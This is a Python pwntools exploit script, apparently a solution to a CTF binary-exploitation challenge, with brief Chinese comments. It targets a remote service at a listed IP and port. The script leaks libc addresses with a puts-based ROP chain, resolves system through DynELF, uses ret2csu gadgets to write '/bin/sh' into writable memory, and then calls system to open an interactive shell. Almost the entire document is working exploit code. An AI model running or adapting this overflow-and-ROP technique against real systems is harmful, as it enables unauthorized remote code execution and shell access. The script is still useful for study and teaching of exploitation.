from pwn import*

context.log_level = 'DEBUG'
context.arch = 'amd64'

start_addr = 0x00400550 # 跳转到entry
pop_rdi = 0x00400763
gadget1 = 0x0040075a
gadget2 = 0x00400740
binsh_addr = 0x00601f00 # 找一块可写内存地址写入/bin/sh

# p = process('../file/bee9f73f50d2487e911da791273ae5a3') # 本地无法成功，不知道原因
p = remote('61.147.171.105', '51536')
elf = ELF("../file/bee9f73f50d2487e911da791273ae5a3")

input('continue?')

puts_addr = elf.plt['puts']
read_addr = elf.got['read']

def leak(addr): #直接用puts泄露的模板，关于DynELF的模板可以上网搜
    payload = b'a'*72
    payload += p64(pop_rdi)
    payload += p64(addr)
    payload += p64(puts_addr)
    payload += p64(start_addr)
    payload = payload.ljust(200, b'a')
    p.send(payload)
    p.recvuntil(b"bye~\n")

    up = b''
    data = b''
    count = 0
    while True:
        c = p.recv(numb=1, timeout=0.1)
        count += 1
        if up == b'\n' and c == b'':
            data = data[:-1]
            data += b'\0'
            break
        else:
            data += c
        up = c
    data = data[:4]
    log.info("%#x => %s" %(addr, (data or b'').hex()))
    return data

d = DynELF(leak, elf=elf) 
system_addr = d.lookup('system', 'libc') #用DynELF获取system地址
log.info("system_addr = %#x", system_addr)

input('continue?')

payload0 = flat(
    b'a'*72,
    gadget1,
    0, # rbx
    1, # rbp
    read_addr, # r12
    8, # r13
    binsh_addr, # r14
    0, # r15
    gadget2,
    b'\0' * 56,
    start_addr
)
payload0 = payload0.ljust(200, b'a')

p.send(payload0)

p.recvuntil(b'bye~\n') #先显示bye才调用的read
p.send(b'/bin/sh\0')

payload1 = b"A"*72 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
payload1 = payload1.ljust(200, b"A")

p.send(payload1)

p.interactive()